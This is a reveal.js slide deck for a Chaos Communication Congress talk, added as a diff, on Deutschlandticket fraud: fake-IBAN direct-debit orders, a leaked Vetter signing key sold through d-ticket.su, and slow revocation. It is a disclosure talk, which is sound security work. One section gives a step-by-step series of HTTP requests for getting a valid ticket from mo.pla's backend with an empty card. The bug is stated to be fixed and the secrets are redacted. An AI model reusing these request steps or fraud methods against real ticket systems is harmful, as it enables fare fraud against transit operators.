@@ -1,0 +1,780 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>All My Deutschlandtickets Gone: Fraud At An Industrial Scale</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="/reveal-js/reset.css">
+    <link rel="stylesheet" href="/reveal-js/reveal.css">
+    <link rel="stylesheet" href="/reveal-js/theme/white.css">
+    <link rel="stylesheet" href="/reveal-js/highlight/monokai.css">
+    <link rel="stylesheet" href="/slides-personal.css">
+</head>
+<body id="reveal">
+<div class="reveal">
+    <div class="slides">
+        <section>
+            <h1>All My Deutschlandtickets Gone</h1>
+            <h2>Fraud At An Industrial Scale</h2>
+            <h3>Q Misell, maya "551724" boeckh</h3>
+
+            <p>39<sup>th</sup> Chaos Communication Congress</p>
+            <p>27<sup>th</sup> of December 2025</p>
+        </section>
+        <section>
+            <p>The contents of this presentation constitutes our own opinions and work.</p>
+            <p>
+                Whilst some of this work has been partially supported by the Max-Planck-Gesellschaft
+                zur Förderung der Wissenschaften e.V., any opinions presented here do not constitute
+                opinions of the Max-Planck-Gesellschaft.
+            </p>
+            <p>
+                This talk has not been endorsed nor sanctioned by the German Government,
+                federal nor state, the University of Ljubljana, the University of Geneva,
+                the Karlsruhe Institute of Technology, the European Union Agency for Railways,
+                the Verband Deutscher Verkehrsunternehmen e.V., the Union internationale des chemins de fer,
+                the Deutschlandtarifverbund GmbH, nor any of their respective members.
+            </p>
+        </section>
+        <section>
+            <h2>Let's go travelling!</h2>
+            <img src="Stadler_Flirt_in_Koblenz_HBF.jpg" alt="" style="width: 1000px">
+            <br/>
+            <small>&copy; Ahm008 - CC BY</small>
+        </section>
+        <section>
+            <h2>Oh...</h2>
+            <img src="25abc09b-5d41-490b-b0f4-2ba6d46a7a3b.png" alt="" style="width: 750px">
+        </section>
+        <section>
+            <h2>Let's go deal shopping!</h2>
+            <img src="59d4de1f-bec7-49be-942b-2b108bdd525a.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <h2>30EUR? Nice!</h2>
+            <img src="b5cbdc3c-aefe-4743-8827-56e804d1c211.png" alt="" style="width: 750px">
+        </section>
+        <section>
+            <h2>15EUR? Even better!</h2>
+            <img src="c9979de0-8f22-47dc-998c-299503666b74.png" alt="" style="width: 600px">
+        </section>
+        <section>
+            <h2>This is what we got</h2>
+            <img src="0ad1a4ff-cbf0-4797-abad-4e969a99e48f.png" alt="" style="width: 750px">
+        </section>
+        <section>
+            <h2>We didn't even get scammed!</h2>
+            <img src="5f1c1562-978a-4549-addb-04e97f54e9b0.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <h1>Hold on...</h1>
+            <h2>What just happened here?</h2>
+	    <aside class="notes">Hand over to maya</aside>
+        </section>
+        <section>
+            <h2>We asked the Stadtwerke...</h2>
+            <blockquote>
+                <p>
+                    People provided fake payment information, which is not verified at the time of the preview -
+                    the ticket is invalid when scanned on the train, because there are also cancellation data available
+                    - but this only applies to the DB. Elsewhere, one might probably get through with such a ticket.
+                </p>
+            </blockquote>
+            <small>Stadtwerke Schweinfurt</small>
+        </section>
+        <section>
+            <h2>Eh?</h2>
+            <ol>
+                <li>Order placed with a fake bank account</li>
+                <li>Stadtwerke doesn't verify the account</li>
+                <li>Issues ticket immediately</li>
+                <li>Maybe they cancel it later</li>
+                <li>Only the DB checks the cancellation list</li>
+            </ol>
+        </section>
+        <section>
+            <h2>SEPA Direct-Debit</h2>
+            <h3>aka. "async reconciliation simulator" </h3>
+            <ul>
+                <li>Not your traditional online card payment</li>
+                <li>Does not require account holder authorization, just an IBAN</li>
+                <li>A valid <em>seeming</em> but fake IBAN is hard to detect</li>
+                <li>Processing anything takes multiple days</li>
+            </ul>
+            <aside class="notes">Direct debit: Lastschriftverkehr</aside>
+        </section>
+        <section>
+            <h2>What even is a mandate, anyway?</h2>
+            <blockquote>
+                <p>
+                    The SEPA Regulation does not specify how a mandate should be signed by the payer.
+                </p>
+            </blockquote>
+            <small>Letter EPC098-13, European Payments Council</small>
+        </section>
+        <section>
+            <h2>"Why can't the issuer just revoke these tickets?"</h2>
+            <p>In the highly distributed world of German public transport,<br/>communicating revocation can be
+                difficult.</p>
+            <p>Issuers can have more success simply removing access in their own app.</p>
+        </section>
+        <section>
+            <h2>On revocation</h2>
+            <ul>
+                <li>Two systems exist for issuing the D-Ticket: VDV-KA and UIC</li>
+                <li>The VDV-KA has their KA-Sperrlistenmanagementsystem (KOSES)</li>
+                <li>The UIC has their electronic Ticket Control Database (eTCD)</li>
+                <li>eTCD only for international traffic</li>
+                <li>No equivalent national system (yet) for UIC tickets</li>
+            </ul>
+        </section>
+        <section>
+            <h2>The Accidental Ticket Laundromat</h2>
+            <img src="b191f760-c279-4117-966b-74e1d9244a23.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <ul>
+                <li>We noticed quite a few tickets paid with direct debit in Zügli</li>
+                <li>All from a only a few IP addresses</li>
+                <li>In the names of dozens of people</li>
+                <li>All in a short span of time</li>
+            </ul>
+            <p><b><em>Oh no...</em></b></p>
+        </section>
+        <section>
+            <h2>Explain?</h2>
+            <ul>
+                <li>Scammers upload fraudulent tickets to Zügli</li>
+                <li>Give Zügli's PKPass to their customers</li>
+                <li>Disconnecting the ticket from the issuer's app</li>
+            </ul>
+            <aside class="notes">Hand off to Q</aside>
+        </section>
+        <section>
+            <h2>So we did some more digging</h2>
+            <h3>They came from here</h3>
+            <img src="6b396d7b-647e-41f8-a137-c7550ca8da62.png" alt="" style="width: 1000px">
+        </section>
+        <section>
+            <ul>
+                <li>This site used Django debug mode in production</li>
+                <li>We can find out where they got tickets from</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Scammers move their operations around</h2>
+            <h3>Possibly to try and avoid detection</h3>
+            <table>
+                <tr>
+                    <th></th>
+                    <th>2024-08</th>
+                    <th>2024-09</th>
+                    <th>2024-10</th>
+                    <th>2024-11</th>
+                    <th>2024-12</th>
+                    <th>2025-01</th>
+                    <th>2025-02</th>
+                </tr>
+                <tr>
+                    <th>DB AG</th>
+                    <td>1</td>
+                    <td></td>
+                    <td>1</td>
+                    <td></td>
+                    <td></td>
+                    <td>2</td>
+                    <td>10</td>
+                </tr>
+                <tr>
+                    <th>RMV GmbH</th>
+                    <td></td>
+                    <td>14</td>
+                    <td>174</td>
+                    <td>184</td>
+                    <td>173</td>
+                    <td>241</td>
+                    <td>11</td>
+                </tr>
+                <tr>
+                    <th>WSW mobil GmbH</th>
+                    <td></td>
+                    <td>117</td>
+                    <td></td>
+                    <td></td>
+                    <td>21</td>
+                    <td></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <th>Ennepe-Ruhr</th>
+                    <td></td>
+                    <td>1</td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <th>Schweinfurt</th>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td>2</td>
+                    <td>101</td>
+                </tr>
+                <tr>
+                    <th>Würzburg</th>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td>1</td>
+                    <td></td>
+                </tr>
+                <tr>
+                    <th>Vetter GmbH</th>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td>1</td>
+                    <td></td>
+                </tr>
+            </table>
+        </section>
+        <section>
+            <h2>We reported this</h2>
+        </section>
+        <section>
+            <h2>This resulted in some panic at the RMV</h2>
+            <img src="f0ac1c7e-8ec3-4c7e-9efb-3f1ae15d353d.png" alt="" style="width: 1000px">
+        </section>
+        <section>
+            <h2>These scammers aren't the smartest</h2>
+            <p>20 tickets uploaded in one day, from one IP - O2/Telefónica Germany residential Internet.</p>
+            <p>That guy on Telegram? His personal PayPal account.</p>
+            <img src="46e38678-9f42-446d-a5d0-ba33f674c7a1.png" alt="" style="width: 400px">
+        </section>
+        <section>
+            <h2>A Curious Conversation</h2>
+            <blockquote>
+                <p>There are apparantly de-ticket scams going arround that issue u tickets that are signed with the
+                    wrong key.</p>
+                <p>It uses keys from Vetter GmbH Omnibus- und Mietwagenbetrieb.</p>
+            </blockquote>
+            <small>A Signal message from a friend</small>
+        </section>
+        <section>
+            <h2>So far, so normal</h2>
+            <img src="a2a1d64f-a876-4288-b5ac-4d8db30417d4.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <h2>Wait, no, that's not right</h2>
+            <p>Senior? Unknown zone?? DB Regio???</p>
+            <div class="columns">
+                <img src="067531f1-4e42-4594-af35-d42f5cc7e56e.png" alt="">
+                <img src="35a6fac1-42f2-4789-a584-01b70fe12e4b.png" alt="">
+                <img src="da124aae-d5c7-4961-87b6-81f69207b514.png" alt="">
+            </div>
+        </section>
+        <section>
+            <h2>Where on earth did this ticket come from?</h2>
+        </section>
+        <section>
+            <h2><code>d-ticket.su</code></h2>
+            <img src="f12a9978-b6ad-41f9-a9b6-4b71de5bbaad.png" alt="" style="width: 1250px">
+        </section>
+        <section>
+            <h2>Not the most reputable of operations</h2>
+            <img src="c5b98977-0d95-4153-a43a-cad6a47137bb.png" alt="" style="width: 1250px">
+        </section>
+        <section>
+            <h2>We bought our own ticket, just to check</h2>
+            <img src="dadf61ef-51b5-452a-a230-ce6ab1a42fda.png" alt="" style="width: 500px">
+        </section>
+        <section>
+            <h2>Yep, that's a Vetter ticket</h2>
+            <img src="181b6573-39e4-4da9-91e6-0ca8cbae01d3.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <h2>What, exactly, happened here?</h2>
+            <ul>
+                <li>We cannot say conclusively (yet)</li>
+                <li>These tickets don't have the hallmarks of payment fraud</li>
+                <li>They're issued in ways Vetter never did</li>
+                <li>There are careless mistakes in issuance</li>
+                <li>Ergo: the private signing key was illictly aquired</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Stealing a UIC private key</h2>
+            <div class="columns">
+                <div>
+                    <h3>Option 1</h3>
+                    <ul>
+                        <li>UIC D-Tickets are signed<br/>with DSA-1024 and SHA-1</li>
+                        <li>Nonce re-use? Leaked key</li>
+                        <li>Poor random number generator?<br/>Leaked key</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>Option 2</h3>
+                    <p>Wrench</p>
+                    <img src="security.png" alt="" style="width: 600px">
+                </div>
+            </div>
+            <div class="columns">
+                <div>
+                    <h3>Option 3</h3>
+                    <p>Dealings under the table</p>
+                </div>
+                <div>
+                    <h3>Option 4</h3>
+                    <ul>
+                        <li>Plain old stupidy</li>
+                        <li>Key left exposed somewhere</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+        <section>
+            <h2>Who's behind this?</h2>
+            <ul>
+                <li>Imprint states: RouteVibe Limited</li>
+                <li>An English company</li>
+                <li>Registered to a random house in London</li>
+                <li>Run by a Chinese national</li>
+                <li>Resident in Italy</li>
+            </ul>
+            <p>???</p>
+        </section>
+        <section>
+            <h2>Some more clues</h2>
+            <p>
+                Apple Wallet Certificate Subject:<br/>
+                <code>UID=pass.com.de-ticket, CN=Pass Type ID: pass.com.de-ticket, OU=X85L8WFJ87, O=Aqib Javeed,
+                    C=US</code>
+            </p>
+            <p>Payment details:</p>
+            <pre><code data-trim class="language-json" data-line-numbers>
+"merchant_data": {
+  "category": "travel_agencies_tour_operators",
+  "category_code": "4722",
+  "city": "HongKong",
+  "country": "HK",
+  "name": "PM *De ticket",
+  "network_id": "54303994",
+  "postal_code": null,
+  "state": null,
+  "tax_id": null,
+  "terminal_id": "WPGTID01",
+  "url": "https://www.payermax.com/"
+}
+</code></pre>
+        </section>
+        <section>
+            <h1>We presented this to Vetter</h1>
+        </section>
+        <section>
+            <h2>Vetter's response</h2>
+            <p>'What are you on about mate, we don't see that?'</p>
+        </section>
+        <section>
+            <h2>Their 'evidence'</h2>
+            <p>Clearly photoshopped with a VDV barcode of the Usedomer Bäderbahn GmbH</p>
+            <img src="1f4eb581-f43c-428e-8a5f-edc51a517c59.png" alt="" style="width: 500px">
+        </section>
+        <section>
+            <h2>Vetter's second attempt at a response</h2>
+            <p>Presented with more evidence, they claimed it wasn't their problem at all! It was their partner mo.pla at
+                fault.</p>
+            <img src="7e33e4ea-788c-449f-abdb-6ccd83c6ae1c.png" alt="" style="width: 1500px">
+        </section>
+        <section>
+            <h2>mo.pla</h2>
+            <ul>
+                <li>Munich tech startup founded around the start of the D-Ticket</li>
+                <li>Seemingly got much of their early stack by buying another company</li>
+                <li>Purchase included Vetter's old private keys</li>
+                <li>Maybe they went walkies in the shake-up?</li>
+                <li>Keys originally generated by mo.pla haven't gone missing</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Vetter(n)wirtschaft</h2>
+            <p>'We have nothing to do with mo.pla, we just use their services, you'll have to ask them.'</p>
+            <p>We don't think so</p>
+        </section>
+        <section>
+            <img src="36800e89-163f-4ff3-bdf0-9ef739fdde99.png" alt="" style="width: 1600px">
+        </section>
+        <section>
+            <h2>So, what do we do?</h2>
+            <ul>
+                <li>Vetter have proven... unreliable</li>
+                <li>Who oversees them?</li>
+                <li>The D-Ticket is primarily overseen by the Deutschlandtarifverbund</li>
+                <li>Report up the chain to them</li>
+            </ul>
+        </section>
+        <section>
+            <h2>A funny email then happened</h2>
+            <blockquote>
+                <p>Please also note that the key 521100001.pem was withdrawn at short notice due to suspected
+                    misuse.</p>
+            </blockquote>
+            <img src="b8ed9658-f76b-4930-b381-89548bb9a7f5.png" alt="" style="width: 1700px">
+        </section>
+        <section>
+            <h2>This took a while</h2>
+            <ul>
+                <li>Initial suspicions raised around September/October 2024</li>
+                <li>Pretty confident on what was going on by the end of November</li>
+                <li>Key revoked early February</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Why did revocation take so long?</h2>
+            <blockquote>
+                <p>
+                    Ein Sperren des Ticketschlüssels noch im Dezember 2024 wurde aufgrund von Urlaub und Krankheit
+                    des verantwortlichen Mitarbeiters nicht durchgeführt.
+                    Ein Back-up für diese Fälle existiert bei der DTVG aufgrund enger Personaldecke nicht.
+                </p>
+            </blockquote>
+        </section>
+        <section>
+            <h2>This isn't the first time</h2>
+            <ul>
+                <li>Vetter have a storied history</li>
+                <li>They've already been kicked out of the VDV-KA for key mis-use</li>
+                <li>Even more impressive that they lost control of HSMs</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Heise: "Warum wurde der Schlüssel zurückgezogen?"</h2>
+            <blockquote>
+                <p>
+                    Wir fahren seit diesem Jahr ein neues Sicherheitskonzept und tauschen die Schlüssel regelmäßig aus.
+                    In dem Zuge sind wir von 521100001.pem auf 521100002.pem umgestiegen. Gegebenenfalls werden wir
+                    dies in kürzeren Intervallen wiederholen.
+                </p>
+            </blockquote>
+        </section>
+        <section>
+            <h2>Have they started rotating keys regularly?</h2>
+            <h1>No</h1>
+            <p>A Vetter D-Ticket bought today will still be signed with the same key as in March.</p>
+        </section>
+        <section>
+            <h2>Revoking the key fixed it, right?</h2>
+            <h3>Right???</h3>
+        </section>
+        <section>
+            <h2>We kept seeing suspicious Vetter tickets</h2>
+            <ul>
+                <li>Dozens of names uploaded to Zügli from a few IPs</li>
+                <li>Signed with the new key</li>
+                <li>Seemingly without the earlier mistakes</li>
+                <li>Actually issued by Vetter, not with a stolen key</li>
+            </ul>
+        </section>
+        <section>
+            <h2>We went digging again</h2>
+            <blockquote>
+                <p>
+                    I forwarded the IDs to mo.pla, and they found out, that their PayPal-payment-process needs some
+                    fixing.
+                    All tickets were bought with the same, empty PayPal account.
+                </p>
+                <br/>
+                <p>
+                    FYI: they insinuated, that Zügli is a tool used for fraudulent actions and that you “decode”
+                    Barcodes,
+                    as if this is a forbidden thing. So please be cautious about what you tell them.
+                </p>
+            </blockquote>
+        </section>
+        <section>
+            <h2>They <em>what</em>?!</h2>
+        </section>
+        <section>
+            <h2>Startup is as startup does</h2>
+            <ul>
+                <li>Some mo.pla developers' code has ended up on Stack Overflow</li>
+                <li>It's typical startup code</li>
+                <li>[shocked pikachu face]</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Stealing a Deutschlandticket<br/>from mo.pla: a how-to</h2>
+            <p>n.b.: this bug has since been fixed</p>
+        </section>
+        <section>
+            <h3>Step 1: Make an account</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=XXX HTTP/1.1
+Content-Type: application/json
+
+{
+  "returnSecureToken": True,
+  "email": "some@email.example",
+  "password": "Hunter2",
+}
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 2: Create a passenger</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://backend.mopla.solutions/api/passengers/create HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer XXX (from Google)
+
+{
+  "authenticationProviderId":"XXX (from Google)",
+  "email":"some@email.example"
+}
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 3: Some personal details</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://backend.mopla.solutions/api/command/addPassengerDetails HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer XXX
+
+{
+  "firstName": "Max",
+  "lastName": "Mustermann",
+  "phone": "+491711234567",
+  "dateOfBirth": "1990-10-03T00:00:00.000Z",
+  "street": "Platz der Vereinten Nationen",
+  "streetNumber": "9",
+  "zipcode": "53113",
+  "city": "Bonn"
+}
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 4: Attach an empty card</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+GET https://backend.mopla.solutions/api/passengers/intent HTTP/1.1
+Authorization: Bearer XXX
+</code></pre>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+payment_method_data[type]=card&
+payment_method_data[card][number]=XXXXXXXXXXXXXXXX&
+payment_method_data[card][cvc]=XXX&
+payment_method_data[card][exp_year]=XXXX&
+payment_method_data[card][exp_month]=XX&
+key=pk_live_XXX&
+client_secret=XXX&
+use_stripe_sdk=false
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 5: Set as the default payment method</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://backend.mopla.solutions/api/command/setDefaultPaymentMethod HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer XXX
+
+{
+  "paymentMethodId": "XXX"
+}
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 6: Create a subscription</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+POST https://backend.mopla.solutions/api/command/createSubscription HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer XXX
+
+{
+  "startDate": "2025-02-01"
+}
+</code></pre>
+        </section>
+        <section>
+            <h3>Step 7: Profit</h3>
+            <pre><code data-trim class="language-http" data-line-numbers>
+GET https://backend.mopla.solutions/api/passengers/tickets HTTP/1.1
+</code></pre>
+            <pre><code data-trim class="language-json" data-line-numbers>
+[{
+   "id":"SOME-UUID",
+   "ticketId":"DT-XXX...",
+   "status":"VALID",
+   "type":"GERMANYTICKET",
+   "validFrom":"2025-01-31T23:00:00Z",
+   "validTo":"2025-03-01T02:00:00Z",
+   "firstName":"Max",
+   "lastName":"Mustermann",
+   "aztecCode":"I1VUMDE.."
+}]
+</code></pre>
+	    <aside class="notes">Hand back to maya</aside>
+        </section>
+        <section>
+            <h1>Im Hintergrund wird repariert</h1>
+            <p>c.f. Der Bahn Song</p>
+        </section>
+        <section>
+            <h2>The scale of the damage</h2>
+            <ul>
+                <li>DB keeps logs of all tickets scanned</li>
+                <li>We looked for Vetter tickets signed with the stolen key in there</li>
+                <li>The DB found 50k</li>
+                <li>This is a lower bound, not all D-Tickets will be scanned</li>
+                <li>There are more VUs than the DB</li>
+                <li>At least 2,9 Million EUR abstracted</li>
+            </ul>
+        </section>
+        <section>
+            <h2>What about the Direct Debit fraud?</h2>
+            <p>2,9 Million < 267 Million</p>
+            <img src="ecd6907c-d864-4b3a-a722-1e67572373a2.png" alt="" style="width: 1500px">
+            <small>VDV-Sondersitzung, 6<sup>th</sup> March 2025</small>
+            <p>
+                267 Million EUR at 49 EUR per month<br/>
+                316 Million EUR at current prices &mdash; ~9 and a half new ICEs
+            </p>
+        </section>
+        <section>
+            <h2>Fixing Payment Fraud</h2>
+            <ul>
+                <li>Withhold issuance until payment is confirmed</li>
+                <li>
+                    Utilise the systems available to secure payments
+                    <ul>
+                        <li>3D Secure</li>
+                        <li>Confirmation of Payee (CoP)</li>
+                    </ul>
+                </li>
+                <li>Effective revocation of issued tickets</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Securing the Keys</h2>
+            <ul>
+                <li>Establish rules for private key handling</li>
+                <li>Penalties and sanctions for fucking up</li>
+                <li>Ideally, audited storage on HSMs</li>
+            </ul>
+        </section>
+        <section>
+            <h2>Sanctions for Vetter?</h2>
+            <p>The contracts establishing the D-Ticket<br/>do not provide for punishment in situations like this.</p>
+        </section>
+        <section>
+            <h2>The better news</h2>
+            <ul>
+                <li>Moving towards central issuance of UIC D-Tickets</li>
+                <li>DTVG has started the rollout of a blocklist for UIC tickets</li>
+                <li>
+                    Currently in use by:
+                    <ul>
+                        <li>Deutsche Bahn (98% of all usage, currently)</li>
+                        <li>
+                            bConn GmbH, as used by:
+                            <ul>
+                                <li>Magdeburger Verkehrsbetriebe</li>
+                                <li>Autobus Oberbayern</li>
+                                <li>Busunternehmen Lehner</li>
+                                <li>Harzer Schmalspurbahnen</li>
+                            </ul>
+                        </li>
+                        <li>
+                            AMCON GmbH, as used by:<br/>
+				Transdev,
+                                Nahverkehrsgesellschaft Hochstift,
+                                Elbe-Weser,
+                                VGE ZOB,
+                                Landkreis Würzburg,
+                                Kalmer,
+                                Veelker
+                        </li>
+                        <li>
+                            INSA, as used by:
+                            <ul>
+                                <li>PVGS Altmarkkreis Salzwedel</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </section>
+        <section>
+            <h2>However</h2>
+            <ul>
+                <li>mo.pla decided not to play along</li>
+                <li>They have established a private revocation system</li>
+                <li>Requiring more integration work from everyone checking their tickets</li>
+            </ul>
+            <aside class="notes">Hand over to Q</aside>
+        </section>
+        <section>
+            <h1>Acknowledgements</h1>
+            <p>Thanks to everyone who helped along the way:</p>
+            <ul>
+                <li>Chris (DTVG)</li>
+                <li>Everyone at the DB, particularly Clemens and Manuel</li>
+                <li>Kurt (UIC/Flemish Parliament)</li>
+                <li>Anja Jenšterle</li>
+                <li>Flüpke</li>
+            </ul>
+        </section>
+        <section>
+            <h1>Question time!</h1>
+            <div class="columns">
+                <div>
+                    <h2>Q</h2>
+                    <p>
+                        Email: qmisell@mpi-inf.mpg.de<br/>
+                        Fedi: @q@glauca.space
+                    </p>
+                </div>
+                <div>
+                    <h2>maya</h2>
+                    <p>
+                        Email: maya@catgirl.global<br/>
+                        Fedi: @maya@catgirl.global
+                    </p>
+                </div>
+            </div>
+            <p>
+                Slides at <a href="https://magicalcodewit.ch/39c3-slides/">magicalcodewit.ch/39c3-slides/</a>
+            </p>
+        </section>
+    </div>
+    <script src="/reveal-js/reveal.js"></script>
+    <script src="/reveal-js/notes/notes.js"></script>
+    <script src="/reveal-js/markdown/markdown.js"></script>
+    <script src="/reveal-js/highlight/highlight.js"></script>
+    <script src="/reveal-js/math/math.js"></script>
+    <script>
+        Reveal.initialize({
+            width: 1920,
+            height: 1080,
+            margin: 0.04,
+            hash: true,
+            plugins: [RevealMarkdown, RevealHighlight, RevealNotes, RevealMath.KaTeX]
+        });
+    </script>
+</body>
+</html>
